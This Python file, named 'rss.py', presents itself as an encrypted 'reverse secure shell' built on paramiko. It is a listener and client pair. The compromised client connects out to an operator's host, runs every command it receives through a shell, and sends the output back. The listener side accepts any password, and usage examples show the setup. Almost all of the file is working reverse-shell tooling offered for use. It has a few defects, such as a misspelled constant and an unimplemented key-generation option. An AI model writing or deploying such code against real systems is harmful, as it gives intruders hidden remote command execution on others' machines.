import argparse
import getpass
import paramiko
import os
import socket
import textwrap
import threading
import shlex
import subprocess
import sys

def execute(cmd):
    cmd = cmd
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT, shell=True)
    return output.decode('latin-1')

class ParamikoServer(paramiko.ServerInterface):
    def __init__(self, username, password):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISRTATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        return paramiko.AUTH_SUCCESSFUL

class RssListener:
    def __init__(self):
        self.target = args.target
        self.port = args.port
        self.cwd = os.path.dirname(os.path.realpath(__file__))
        self.key = paramiko.RSAKey(filename=os.path.join(self.cwd, args.key))
        self.event = threading.Event()

    def run(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((self.target, self.port))
            sock.listen(100)
            print('[+] Listening for connection ----')
            client, addr = sock.accept()

        except Exception as e:
            print('[-] Listen Failed: '+ str(e))

        else:
            print('[+] Got a connection ', client, addr)

        session = paramiko.Transport(client)
        session.add_server_key(self.key)
        server = ParamikoServer(username="Arthur", password="Azerty")
        session.start_server(server=server)

        chan = session.accept(20)
        if chan is None:
            print("*** No channel.")
            sys.exit(1)

        print('[+] Authenticated!')

        while True:
            command = input("rss> ")
            try:
                if 'exit' in command:
                    chan.close()
                    break
                else:
                    chan.send(command.encode('utf-8').strip())

                    recv_len = 1
                    response = ''
                    while recv_len:
                        data = chan.recv(4096)
                        recv_len = len(data)
                        response += data.decode('utf-8')
                        if recv_len < 4096:
                            break
                    print(response)
            except Exception as e:
                print("[-] Session close: "+str(e))
        chan.close()




class RssClient:
    def __init__(self):
        self.target = args.target
        self.port = args.port

    def run(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(self.target, port=self.port, username="Arthur", password="Azerty")
        session = client.get_transport().open_session()

        if session.active:
            print("[+] Connected")
            cmd_buffer = b''
            while True:
                try:
                    recv = session.recv(64)
                    recv_len = len(recv)
                    cmd_buffer += recv
                    if type(cmd_buffer) == str:
                        response = execute(cmd_buffer)
                    else:
                         response = execute(cmd_buffer.decode('utf-8'))
                    if response:
                        session.send(response.encode('utf-8').strip())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    session.close()
                    sys.exit()



if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Reverse secure shell is a reverse shell which provide an encryption with a shared secret',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent('''Example:
                                     python3 rss.py -l -t 192.168.1.2 -p 9999 -k key.key # Open a listener in 192.168.1.2:9999 with an encryption with the key
                                     python3 rss.py -t 192.168.1.2 -p 9999 # Connect to the listener
                                     python3 rss.py -g key.key # Generate a key                                     
                                     '''))
    parser.add_argument('-l', '--listen', action='store_true', help="listenner")
    parser.add_argument('-p', '--port', type=int, default=9999, help="port")
    parser.add_argument('-t', '--target', default='127.0.0.1', help='specified IP')
    parser.add_argument('-k', '--key', default='key.key', help='specified shared key')
    parser.add_argument('-g', '--generate', action='store_true', help="generate a key")
    args = parser.parse_args()

    if args.listen:
        listener = RssListener()
        listener.run()
    elif args.generate:
        pass
    else:
        client = RssClient()
        client.run()




